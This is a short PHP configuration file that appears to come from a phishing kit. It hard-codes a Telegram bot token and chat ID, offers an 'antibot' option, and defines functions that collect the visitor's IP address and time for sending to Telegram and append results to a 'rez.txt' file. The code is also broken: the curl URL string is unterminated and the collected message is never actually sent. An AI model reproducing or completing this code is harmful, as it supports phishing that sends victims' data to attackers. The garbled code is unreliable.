<?php

$token = "9108139118:AAEisCNeCi_q_-0DNVTz_icKHKybrU_dTRc";
$id = "-1003987841987";

// use antibot? yes|no
$antibot = "yes";

function call($msg){
    global $token;
    global $id;
    $info = "\n\n/- MORE INFO -/\nIP: " . $_SERVER['REMOTE_ADDR'] . "\nTIME: " . date("m/d/Y h:i:sa");

    $c = curl_init('https://telegram.org);
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
    $res = curl_exec($c);
    curl_close($c);
    return $res;
}

function save($txt){
    $fp = fopen((__DIR__)."/rez.txt", "a");
    fwrite($fp, $txt);
    fclose($fp);
}

?>
